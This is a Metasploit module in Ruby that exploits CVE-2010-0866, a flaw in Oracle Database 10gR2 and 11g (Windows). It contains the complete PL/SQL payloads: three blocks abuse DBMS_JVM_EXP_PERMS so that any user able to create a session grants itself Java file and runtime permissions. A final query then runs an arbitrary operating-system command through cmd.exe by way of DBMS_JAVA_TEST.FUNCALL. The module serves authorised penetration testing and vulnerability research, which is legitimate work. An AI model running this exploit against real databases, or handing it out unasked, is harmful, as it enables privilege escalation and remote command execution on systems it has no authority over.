##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::ORACLE

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Oracle DB 10gR2, 11gR1/R2 DBMS_JVM_EXP_PERMS OS Command Execution',
      'Description'    => %q{
          This module exploits a flaw (0 day) in DBMS_JVM_EXP_PERMS package that allows
        any user with create session privilege to grant themselves java IO privileges.
        Identified by David Litchfield. Works on 10g R2, 11g R1 and R2 (Windows only)
      },
      'Author'         => [ 'sid[at]notsosecure.com' ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'CVE', '2010-0866'],
          [ 'OSVDB', '62184'],
          [ 'URL', 'http://blackhat.com/html/bh-dc-10/bh-dc-10-archives.html#Litchfield' ],
          [ 'URL', 'http://www.notsosecure.com/folder2/2010/02/04/hacking-oracle-11g/' ],
        ],
      'DisclosureDate' => 'Feb 1 2010'))

    register_options(
      [
        OptString.new('CMD', [ false, 'CMD to execute.',  "echo metasploit >> %SYSTEMDRIVE%\\\\unbreakable.txt"]),
      ])
  end

  def run
    return if not check_dependencies

    name = Rex::Text.rand_text_alpha(rand(10) + 1)


    package1 = "DECLARE POL DBMS_JVM_EXP_PERMS.TEMP_JAVA_POLICY;" +
      "CURSOR C1 IS SELECT 'GRANT',USER(), 'SYS','java.io.FilePermission','"
    package1 << "<" << "<ALL FILES>>','execute','ENABLED' from dual;" +
      "BEGIN OPEN C1;FETCH C1 BULK COLLECT INTO POL;CLOSE C1;DBMS_JVM_EXP_PERMS.IMPORT_JVM_PERMS(POL);END;"
    package2 = "DECLARE POL DBMS_JVM_EXP_PERMS.TEMP_JAVA_POLICY;" +
      "CURSOR C1 IS SELECT 'GRANT',USER(), 'SYS','java.lang.RuntimePermission','writeFileDescriptor',NULL,'ENABLED' FROM DUAL;" +
      "BEGIN OPEN C1;FETCH C1 BULK COLLECT INTO POL;CLOSE C1;DBMS_JVM_EXP_PERMS.IMPORT_JVM_PERMS(POL);END;"
    package3 = "DECLARE POL DBMS_JVM_EXP_PERMS.TEMP_JAVA_POLICY;" +
      "CURSOR C1 IS SELECT 'GRANT',USER(), 'SYS','java.lang.RuntimePermission','readFileDescriptor',NULL,'ENABLED' FROM DUAL;" +
      "BEGIN OPEN C1;FETCH C1 BULK COLLECT INTO POL;CLOSE C1;DBMS_JVM_EXP_PERMS.IMPORT_JVM_PERMS(POL);END;"

    os_code = "select DBMS_JAVA_TEST.FUNCALL('oracle/aurora/util/Wrapper','main','c:\\windows\\system32\\cmd.exe', '/c', ' #{datastore['CMD']}')from dual"

    begin
      print_status("Attempting to grant JAVA IO Privileges")
      prepare_exec(package1)
      prepare_exec(package2)
      prepare_exec(package3)
      print_status("Attempting to execute OS Code")
      prepare_exec(os_code)
    rescue => e
      print_error("Error: #{e.class} #{e}")
    end
  end
end
